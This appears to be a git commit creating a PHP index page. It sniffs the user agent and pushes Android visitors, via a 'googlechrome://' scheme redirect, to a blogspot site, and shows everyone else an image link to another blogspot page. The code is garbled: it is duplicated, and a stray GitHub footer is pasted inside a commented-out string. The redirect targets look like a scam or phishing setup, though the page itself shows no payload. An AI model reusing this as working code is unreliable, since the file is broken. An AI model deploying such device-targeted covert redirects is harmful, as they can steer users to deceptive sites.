9456889623ca056af511324fc819c8e1b304ae1f
limberlisa <54564259+limberlisa@users.noreply.github.com>
2020-01-20 19:52:50 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,90 @@
+<?php
+// $url = "https://<?php
+// $url = "https://sedate-grade.surge.sh";
+// $updateGoTo = "googlechrome://navigate?url=".$url;
+
+// header(sprintf("Location: %s", $updateGoTo));
+?>
+
+<?php
+$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
+
+if ($iphone == true)
+{
+$url = "https://trofeorsmaterilesasasa.blogspot.com/";
+$updateGoTo = "googlechrome://navigate?url=".$url;
+
+header(sprintf("Location: %s", $updateGoTo));
+
+
+}else{
+
+echo '<center>';
+echo '<a href="https://tirandojordanmasterli.blogspot.com/">';
+echo '<img style="margin-top: 45px" src="https://telegra.ph/file/2ad6bcc4826c0f41081dc.jpg" width="240" height="100"/>';
+echo '</a>';
+echo '</center>';
+}
+?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <head>
+  	<title>Heloos</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  </head>
+
+  <body>
+
+
+
+
+
+
+
+  </body>
+</html>
+© 2020 GitHub, Inc.";
+// $updateGoTo = "googlechrome://navigate?url=".$url;
+
+// header(sprintf("Location: %s", $updateGoTo));
+?>
+
+<?php
+$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
+
+if ($iphone == true)
+{
+$url = "https://trofeorsmaterilesasasa.blogspot.com/";
+$updateGoTo = "googlechrome://navigate?url=".$url;
+
+header(sprintf("Location: %s", $updateGoTo));
+
+
+}else{
+
+echo '<center>';
+echo '<a href="https://tirandojordanmasterli.blogspot.com/">';
+echo '<img style="margin-top: 45px" src="https://telegra.ph/file/2ad6bcc4826c0f41081dc.jpg" width="240" height="100"/>';
+echo '</a>';
+echo '</center>';
+}
+?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <head>
+  	<title>Heloos</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  </head>
+
+  <body>
+
+
+
+
+
+
+
+  </body>
+</html>
